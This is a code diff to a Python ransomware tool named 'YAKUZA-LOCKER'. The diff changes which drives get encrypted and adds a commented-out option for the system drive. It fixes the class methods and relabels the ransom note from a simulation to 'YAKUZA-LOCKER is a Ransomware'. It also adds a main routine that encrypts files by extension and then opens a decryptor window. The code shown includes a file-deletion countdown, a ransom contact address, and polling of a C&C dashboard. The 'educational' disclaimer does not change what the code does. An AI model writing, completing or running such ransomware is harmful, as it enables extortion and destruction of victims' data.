@@ -6,6 +6,7 @@ Disclaimer: this app written only and only for educational purpose
 import binascii
 import logging
 import sys
+
 from base64 import b64encode, b64decode
 import base64
 from ctypes import windll
@@ -90,7 +91,8 @@ THANKS_PATH = resource_path("img/thank_you.png")
 ensure_time_dir_exist()
 
 # You can customize choose the drives you want to encrypt
-DRIVES_TO_ENCRYPT = ["F:", "E:"]
+DRIVES_TO_ENCRYPT = ["F:", "G:"]
+# DRIVES_TO_ENCRYPT = ["C:"]
 
 # File Extension to be encrypted, File Extension's can be customized based on a yor target
 EXTENSION_TO_ENCRYPT = [".txt", ".jpg", ".png", ".pdf", ".zip", ".rar", ".xlsx", ".docx"]
@@ -134,8 +136,8 @@ class EncryptionTool:
         self.key = self.generate_key(password)  # noqa
         self.machine_id = str(uuid4())
 
-    @staticmethod
-    def generate_key(password):
+
+    def generate_key(self, password):
         """ this function generates a key from the password as argument which is PASSWORD_PROVIDED
         :param: password
         :return: key
@@ -157,8 +159,7 @@ class EncryptionTool:
             raise
 
     # Create Function to Set Wallpaper on the target machine after ransom running
-    @staticmethod
-    def set_wallpaper(wallpaper_path):
+    def set_wallpaper(self, wallpaper_path):
         try:
             windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 0)
             logging.info(f"[+] Wallpaper Set Successfully to {wallpaper_path}. ")
@@ -166,8 +167,7 @@ class EncryptionTool:
             logging.error(f"[-] Failed to set Wallpaper => Error: {str(e)}")
 
     # Function to Create Important Files on the target machine
-    @staticmethod
-    def create_important_files(directory_path):
+    def create_important_files(self, directory_path):
         try:
             # Create a path of D-Data and then Create it if the D-Data directory doesn't exist
             dDataPath = path.join(directory_path, "D-Data")
@@ -290,7 +290,7 @@ Your Security Team
     # Function to save the encryption key locally
     def save_key_locally(self):
         # Create Hardcoded Path for saving key
-        keyPath = path.join('E:', 'encryption_key.txt')
+        keyPath = path.join('D:', 'encryption_key.txt')
         try:
             makedirs(path.dirname(keyPath), exist_ok=True)
 
@@ -352,7 +352,7 @@ Your Security Team
             logging.error("[-] Failed to Save the Encryption Key Locally.")
 
         # create Path of wallpaper & Set wallpaper on the target machine
-        wallpaperPath = resource_path("img/wallpaper.png")
+        wallpaperPath = resource_path(r"img/wallpaper.png")
 
         self.set_wallpaper(wallpaperPath)  # noqa
         logging.info("[+] Wallpaper Set Successfully.")
@@ -398,11 +398,11 @@ class CustomSecondaryTerminationKeyDialog(simpledialog.Dialog):
      Secondary Termination key can Prevent Encryption File Deletion if target not paid """
 
     def __init__(self, parent, icon_path, title, prompt):
-        super().__init__(parent, title)
         self.iconPath = icon_path
         self.prompt = prompt
+        super().__init__(parent, title)
 
-    # Setup Dialog UI
+    # Step 19: Setup Dialog UI
     def body(self, master):
         # Set Icon
         self.iconbitmap(self.iconPath)
@@ -565,8 +565,7 @@ class DeletionCountdownDialog(Toplevel):
 
 
     # Function to show warning when target tries to close app
-    @staticmethod
-    def on_try_close():
+    def on_try_close(self):
         messagebox.showwarning("Warning", "This window cannot be closed directly.")
 
     # Function to Handle submission of the secondary termination key to stop a deletion process
@@ -574,8 +573,8 @@ class DeletionCountdownDialog(Toplevel):
         self.iconbitmap(ICON_PATH)
 
         # Show Custom Secondary Termination Key Dialog Box to get Key from target input
-        key = CustomSecondaryTerminationKeyDialog(self, icon_path=ICON_PATH, title="Stop Deletion",
-                                                  prompt="Enter the secondary termination key:").result
+        key = CustomSecondaryTerminationKeyDialog(self, ICON_PATH, "Stop Deletion",
+                                                  "Enter the secondary termination key:").result
 
         # Checked if inputted the key same as Secondary Termination Key, then Stop deletion Process
         if key == SECONDARY_TERMINATION_KEY:
@@ -622,7 +621,7 @@ class DecryptorApp(Tk):
             self.destroy()
 
         # Start multithread for Checking Self Destroy Remote signal from POC-C&C Dashboard
-        Thread(target=self.check_for_remote_stop_signal, args=self.machineId, daemon=True).start()
+        Thread(target=self.check_for_remote_stop_signal, args=(self.machineId,), daemon=True).start()
 
     # this function stop deletion process when stop_signal arrived from POC-C&C Dashboard
     def check_for_remote_stop_signal(self, machine_id, check_interval=10):
@@ -677,7 +676,7 @@ class DecryptorApp(Tk):
         logoLabel.pack(padx=(0, 20), side=LEFT)
 
         # Add & Stylish Text, Label for Ransomware Notes
-        ransomNotes = """ | PROOF OF CONCEPT: RANSOMWARE SIMULATION | \n\n
+        ransomNotes = """ | YAKUZA-LOCKER is a Ransomware | \n\n
 | Attention: Your Files Are Encrypted | \n\n
 This simulation is solely for educational purposes and must not be used maliciously.
 Users are fully accountable for their actions.
@@ -690,7 +689,7 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
         ransomNoteLabel.pack(side=LEFT, padx=(10, 20))
 
         # Creating the text with suitable tags
-        ransomNoteLabel.insert(END, " Proof of Concept: Yakuza Ransomware Simulation \n", "center_green")
+        ransomNoteLabel.insert(END, " YAKUZA-LOCKER is a Ransomware \n", "center_green")
         ransomNoteLabel.insert(END, "| Attention: Your Files Are Encrypted | \n\n", "center_green")
         ransomNoteLabel.insert(END, "This simulation is Only & Only for educational purposes and must not "
                                        "be used maliciously. \n", "center_white")
@@ -890,7 +889,6 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
                                                        '[-] Failed to decrypt one or more files. Please check the decryption key and try again.'))
 
     # Function to Show Incomplete Decryption Message Dialog
-    @staticmethod
     def show_incomplete_message(self, decrypted_count, total_files):
         messagebox.showwarning("Decryption Incomplete",
                                f"Decryption completed for {decrypted_count} out of {total_files} files.")
@@ -1047,8 +1045,7 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
 
 
     #Step 52: Function to delete the timer state file
-    @staticmethod
-    def delete_timer_state_file():
+    def delete_timer_state_file(self):
         try:
             # Delete the timer state file
             remove(TIMER_STATE_FILE)
@@ -1056,7 +1053,6 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
             pass
 
     # Step 53: Function to delete the timer and machine ID files
-    @staticmethod
     def delete_timer_and_machine_id_files(self):
         try:
             remove(TIMER_STATE_FILE)
@@ -1157,7 +1153,7 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
 
             # first, if D-Data exists, delete all files in the D-Data
             if path.exists(dDataPath):
-                
+
                 # submit log and delete all files in the D-Data
                 self.log(f"[+] Start Deletion files in {dDataPath}...")
                 handle_deletion(dDataPath)
@@ -1178,9 +1174,32 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
             if self.stopEvent.is_set():
                 break
 
-
-
+""" Part 10: Main Execution 
+Only Step 57 """
 
 if __name__ == "__main__":
-    # Create an instance of the EncryptionTool class
-    decryptor = DecryptorApp()
+    # Step 57: Check if the Machine ID file exists
+    machineId = load_machine_id()
+
+    # If Machine ID exists, skip encryption and launch decryption GUI
+    if machineId:
+        app = DecryptorApp()
+        app.mainloop()
+
+    #I f Machine ID does not exist, first start an encryption process and then launch decryption GUI
+    else:
+        # First start an encryption process
+        encryptionTool = EncryptionTool(DRIVES_TO_ENCRYPT, EXTENSION_TO_ENCRYPT,
+                                        PASSWORD_PROVIDED, DASHBOARD_URL, MAX_ATTEMPTS, DELAY)
+        encryptionTool.execute()
+
+        # Then launch decryption GUI
+        app = DecryptorApp()
+        app.mainloop()
+
+
+
+
+
+
+
